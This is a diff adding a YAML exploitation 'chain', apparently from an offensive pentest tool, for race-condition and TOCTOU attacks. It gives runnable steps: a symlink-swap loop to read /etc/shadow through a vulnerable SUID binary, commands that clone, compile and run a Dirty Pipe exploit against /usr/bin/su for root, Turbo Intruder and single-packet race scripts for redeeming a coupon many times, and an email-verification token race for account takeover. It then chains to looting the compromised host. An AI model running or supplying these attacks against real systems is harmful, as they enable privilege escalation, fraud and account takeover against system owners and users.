@@ -1,0 +1,125 @@
+id: race-condition-toctou
+name: "Web / Linux — race condition / TOCTOU exploitation"
+description: >
+  Time-of-check / time-of-use bugs let you change a value between when
+  the app validates it and when it acts on it. Two flavors: file-system
+  TOCTOU (Linux privesc), and HTTP race-window (limit bypass, IDOR via
+  parallel requests, double-spend).
+tags: [race-condition, toctou, web, linux, priv-esc]
+difficulty: hard
+
+inputs: []
+
+steps:
+  - id: identify_target
+    name: "Identify a TOCTOU candidate"
+    inline_command: |
+      echo 'File-system TOCTOU triggers:
+        - SUID binary that stats a path → opens it (symlink swap window)
+        - cron job: chown/chmod-ing files in /tmp or any writable dir
+        - umask 0/000 + race to write into a privileged dir before chmod
+        - PHP file_get_contents on a path the app then chmod-s 600
+
+      HTTP race triggers:
+        - Coupon code redemption (apply same code N times in parallel)
+        - Withdraw funds (initiate N withdrawals before balance update)
+        - Email verification (re-use the token N times before invalidation)
+        - User signup (claim a reserved username via concurrent POSTs)
+        - 2FA enrollment (race the disable-2FA endpoint with re-add)'
+
+  - id: filesystem_toctou
+    name: "File-system TOCTOU: symlink swap during SUID validation"
+    inline_command: |
+      # Vulnerable SUID app at /usr/local/bin/vuln-app that:
+      # 1) stats /tmp/in.txt — checks owned by current user
+      # 2) opens it as root
+      # → Race: between stat() and open(), swap a symlink.
+
+      cat > /tmp/in.txt <<'EOF'
+      legitimate content
+      EOF
+
+      # Race loop:
+      while true; do
+        ln -sf /tmp/in.txt /tmp/sym
+      done &
+      LOOP1=$!
+      while true; do
+        ln -sf /etc/shadow /tmp/sym
+      done &
+      LOOP2=$!
+
+      # In another shell:
+      while true; do /usr/local/bin/vuln-app /tmp/sym; done
+
+      # Kill the loops when you see /etc/shadow content:
+      kill $LOOP1 $LOOP2
+
+  - id: dirty_pipe_cve_2022_0847
+    name: "Modern kernel TOCTOU — Dirty Pipe (CVE-2022-0847)"
+    inline_command: |
+      # Linux 5.8 - 5.16 — write to any read-only file via pipe splice.
+      # Used to overwrite /etc/passwd root entry with attacker hash.
+      git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits /tmp/dp
+      gcc /tmp/dp/exploit-1.c -o /tmp/dp/exploit-1
+      /tmp/dp/exploit-1 /usr/bin/su  # replaces su's setuid bytes → root via patched su
+
+  - id: http_race_with_turbo_intruder
+    name: "HTTP race — Burp Turbo Intruder (single-packet attack)"
+    inline_command: |
+      # In Burp → extension Turbo Intruder → load this script:
+      cat > race.py <<'EOF'
+      def queueRequests(target, wordlists):
+          engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, engine=Engine.BURP2)
+          # Send 30 identical requests in a single HTTP/2 packet:
+          for i in range(30):
+              engine.queue(target.req)
+      def handleResponse(req, interesting):
+          table.add(req)
+      EOF
+      # Many "limit once" endpoints break under this single-packet attack:
+      # all requests arrive within the same TCP segment, hit the DB before
+      # the row-lock kicks in.
+
+  - id: http_race_with_h2
+    name: "HTTP/2 last-byte sync (most reliable race window)"
+    inline_command: |
+      # James Kettle's technique: queue 30 requests, hold the LAST byte
+      # of each, then release them all at once with one TLS write.
+      # Tools: Turbo Intruder (Burp), or Frans Rosén's "race-the-web".
+      python3 -c '
+      from race_the_web import single_packet_attack
+      single_packet_attack(
+          url="https://target.com/redeem",
+          method="POST",
+          body={"code": "PROMO25"},
+          headers={"Cookie": "session=..."},
+          concurrent=30,
+      )'
+
+  - id: account_takeover_via_race
+    name: "Famous race takeover: re-use email-verify token"
+    inline_command: |
+      # 1) Sign up with attacker@evil.com for username `admin`. Get verify token.
+      # 2) Use the verify token N times in parallel — each request looks up
+      #    the token, marks it used, sets your email. If the lookup happens
+      #    before the prior update committed → you can race past `unique email`
+      #    constraints and reuse the verify on a SECOND account claiming
+      #    victim's email.
+      # Tools: caido / Burp Turbo Intruder with the script above.
+
+references:
+  - title: "PortSwigger — Race conditions"
+    url:   "https://portswigger.net/web-security/race-conditions"
+  - title: "Single-packet attack (James Kettle)"
+    url:   "https://portswigger.net/research/smashing-the-state-machine"
+  - title: "Dirty Pipe (CVE-2022-0847)"
+    url:   "https://dirtypipe.cm4all.com/"
+
+next_chains:
+  - chain: shell-stabilization
+    when:   'kernel race popped a root shell'
+    reason: 'Stabilize the new root shell.'
+  - chain: linux-priv-esc-recon
+    when:   'gained root via TOCTOU'
+    reason: 'Loot the box.'
